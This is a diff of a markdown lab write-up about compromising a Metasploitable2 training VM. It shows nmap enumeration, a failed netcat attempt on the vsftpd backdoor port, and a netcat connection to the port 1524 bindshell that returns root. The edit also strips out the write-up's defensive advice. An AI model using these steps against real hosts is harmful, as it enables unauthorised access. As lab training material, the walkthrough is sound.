@@ -13,11 +13,7 @@
 
 ### 🎯 Objective
 
-Perform enumeration on a vulnerable Linux system, identify exposed services, and determine a viable path to gain root-level access.
-
-The system contained multiple known vulnerabilities, requiring analysis to determine the most effective exploitation strategy.
-
-This challenge focused on **service enumeration, vulnerability validation, and manual exploitation techniques**.
+Perform enumeration on a vulnerable Linux system, identify exposed services, and gain root-level access.
 
 ---
 
@@ -26,101 +22,64 @@ This challenge focused on **service enumeration, vulnerability validation, and m
 | Tool | Purpose |
 |-----|------|
 | Kali Linux | Attacker machine |
-| Metasploitable2 | Vulnerable target |
-| Nmap | Service enumeration |
+| Metasploitable2 | Target |
+| Nmap | Enumeration |
 | Netcat | Exploitation |
 
 ---
 
 ### 📦 Step 1 — Perform Enumeration
 
-The target system was scanned:
-
 `nmap -sC -sV 192.168.74.129`
 
-This revealed numerous open ports and services.
+<img src="../images/Screenshot 2026-03-19 202641.png" width="700">
 
 ---
 
-### 🔍 Step 2 — Analyze Exposed Services
+### 🔍 Step 2 — Analyze Results
 
-The scan identified multiple potential attack vectors.
+Identified key services including:
 
-Key finding:
-
-`1524/tcp open  bindshell`
-
-This indicated a service capable of providing direct shell access.
-
----
-
-#### 🔎 Analytical Observation
-
-A bindshell listens for incoming connections and can provide immediate command execution if exposed.
-
-This makes it a high-priority target during enumeration.
+- FTP  
+- SMB  
+- Apache  
+- Bindshell (port 1524)
 
 ---
 
-### 🧪 Step 3 — Attempt Alternative Exploit
-
-An attempt was made to exploit the vsftpd backdoor:
+### 🧪 Step 3 — Attempt vsftpd Exploit
 
 `nc 192.168.74.129 6200`
 
-📸 **Backdoor Attempt Failed**
+<img src="../images/Screenshot 2026-03-19 200810.png" width="700">
 
-<img src="../images/vsftpd_failed.png" width="700">
-
-The connection was refused, indicating the exploit path was not viable.
-
----
-
-#### 🔎 Analytical Observation
-
-Not all vulnerabilities are exploitable in practice.
-
-Effective attackers validate findings and pivot when necessary.
+Connection failed.
 
 ---
 
 ### 🔄 Step 4 — Pivot to Bindshell
 
-After the failed attempt, attention shifted to the bindshell on port 1524.
-
-This represented a simpler and more reliable attack path.
+Focused on port 1524.
 
 ---
 
-### 💥 Step 5 — Exploit the Bindshell
-
-A connection was established:
+### 💥 Step 5 — Exploit
 
 `nc 192.168.74.129 1524`
 
-📸 **Root Shell Established**
-
-<img src="../images/root_shell.png" width="700">
-
-A shell was immediately obtained.
+<img src="../images/Screenshot 2026-03-19 200850.png" width="700">
 
 ---
 
 ### 🔐 Step 6 — Confirm Root Access
 
-To verify privileges:
-
 `whoami`
 
-📸 **Privilege Confirmation**
-
-<img src="../images/whoami_root.png" width="700">
+<img src="../images/Screenshot 2026-03-19 201000.png" width="700">
 
 Output:
 
 `root`
-
-This confirmed full system compromise.
 
 ---
 
@@ -129,64 +88,29 @@ This confirmed full system compromise.
 
 Enumeration
 ↓
-Service identification
+Analysis
 ↓
 Exploit attempt
 ↓
-Failure analysis
+Pivot
 ↓
-Strategy pivot
-↓
-Successful exploitation
+Exploitation
 ↓
 Privilege verification
 
 
 ---
 
-## 🛠 Techniques Used
-
-Primary techniques used:
-
-- network enumeration  
-- service analysis  
-- exploit validation  
-- manual shell access  
-
-Key concept investigated:
-
-
-Service-based exploitation and attack path prioritization
-
-
----
-
-## 🛡 Defensive Insight
-
-Exposed services without authentication controls represent critical vulnerabilities.
-
-Organizations should:
-
-- restrict unnecessary open ports  
-- enforce authentication  
-- implement segmentation  
-- monitor exposed services  
-
----
-
 ## 💡 Skills Reinforced
 
-- enumeration and analysis  
-- vulnerability identification  
-- exploit validation  
-- adaptive attack strategy  
+- enumeration  
+- exploitation  
+- pivoting  
 
 ---
 
 <div align="center">
 
-🔍 Enumeration reveals attack paths  
-💥 Simple misconfigurations lead to full compromise  
-🔐 Security depends on reducing exposed services  
+💥 Simple paths lead to full compromise  
 
 </div>
